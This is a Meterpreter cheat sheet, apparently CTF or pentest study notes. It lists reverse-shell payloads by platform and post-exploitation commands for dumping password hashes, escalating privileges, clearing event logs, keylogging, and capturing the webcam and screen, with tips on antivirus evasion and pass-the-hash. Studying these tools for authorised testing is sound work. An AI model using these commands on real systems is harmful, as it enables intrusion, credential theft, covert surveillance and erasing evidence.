# Meterpreter Cheat Sheet

## What is Meterpreter?
- Metasploit payload that runs in memory (RAM) — never written to disk
- Avoids AV detection because there's no file to scan
- Uses encrypted TLS communication back to your machine
- Different versions for different targets (Windows, Linux, Android, PHP, Python, etc.)

---

## Choosing the Right Payload

| Target | Payload |
|---|---|
| Windows 64-bit | `windows/x64/meterpreter/reverse_tcp` |
| Windows 32-bit | `windows/meterpreter/reverse_tcp` |
| Linux 64-bit | `linux/x64/meterpreter/reverse_tcp` |
| Linux 32-bit | `linux/x86/meterpreter/reverse_tcp` |
| PHP web app | `php/meterpreter/reverse_tcp` |
| Android | `android/meterpreter/reverse_tcp` |

**Rule:** Match the payload arch to the target OS arch. Wrong arch = session dies immediately.

---

## Core Commands

| Command | Description |
|---|---|
| `help` | List all available commands |
| `background` / `bg` | Background the session, return to msfconsole |
| `sessions` | List all active sessions |
| `sessions -i 1` | Interact with session 1 |
| `exit` | Terminate the session |
| `getuid` | Show current user (tells you your privilege level) |
| `getpid` | Show the process ID Meterpreter is running under |
| `sysinfo` | Target OS, hostname, arch info |
| `ps` | List running processes |
| `migrate [PID]` | Move Meterpreter into another process |
| `shell` | Drop into a system command shell (CTRL+Z to return) |
| `run [module]` | Run a post-exploitation module |

---

## File System Commands

| Command | Description |
|---|---|
| `ls` / `dir` | List files in current directory |
| `pwd` | Print current directory |
| `cd [path]` | Change directory |
| `cat [file]` | Read a file |
| `search -f [filename]` | Search filesystem for a file |
| `upload [file]` | Upload file to target |
| `download [file]` | Download file from target |
| `edit [file]` | Edit a file on target |
| `rm [file]` | Delete a file |

---

## Networking Commands

| Command | Description |
|---|---|
| `ifconfig` | Show network interfaces on target |
| `arp` | Show ARP cache |
| `netstat` | Show network connections |
| `portfwd add -l 8080 -p 80 -r TARGET` | Forward local port to remote service |
| `route` | View/modify routing table |

---

## System Commands

| Command | Description |
|---|---|
| `getsystem` | Attempt privilege escalation to SYSTEM |
| `hashdump` | Dump Windows SAM database (NTLM hashes) — Windows only |
| `clearev` | Clear Windows event logs |
| `kill [PID]` | Kill a process |
| `reboot` | Reboot target |
| `shutdown` | Shutdown target |

---

## Post Exploitation Modules

```bash
# Dump hashes on Linux
run post/linux/gather/hashdump

# Dump hashes on Windows (alternative to hashdump command)
run post/windows/gather/hashdump

# Gather system info
run post/multi/gather/env

# Check if running in a VM
run post/multi/gather/vmware_version
```

---

## Migrate Command (Important)

Migrating moves Meterpreter into another process:
- Makes the session more stable
- Can be used for keylogging (migrate into a word processor)
- **Warning:** migrating from high privilege to low privilege loses your access level

```bash
ps                    # find a stable process like explorer.exe or spoolsv.exe
migrate [PID]         # migrate to that PID
getuid                # confirm you still have the right privileges
```

---

## Hashdump Output Format (Windows)

```
username : RID : LM hash : NTLM hash
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

- **RID** — user account number
- **LM hash** — `aad3b435b51404eeaad3b435b51404ee` always means LM hashing is disabled (placeholder)
- **NTLM hash** — the real hash, use this for cracking or pass-the-hash attacks

---

## Keylogger (Windows)

```bash
migrate [PID of notepad.exe or word.exe]
keyscan_start
# wait for target to type something
keyscan_dump
keyscan_stop
```

---

## Screenshot / Webcam

```bash
screenshot           # grab screenshot of target desktop
webcam_list          # list webcams
webcam_snap          # take a photo
screenshare          # live view of desktop
```

---

## Notes
- Always run `getuid` first to know your privilege level
- Always run `sysinfo` to confirm what you're on
- `hashdump` is Windows only — use `run post/linux/gather/hashdump` on Linux
- Meterpreter sessions can die — use `nohup` when executing payloads on Linux targets
- `search -f flag.txt` is your friend in CTF environments
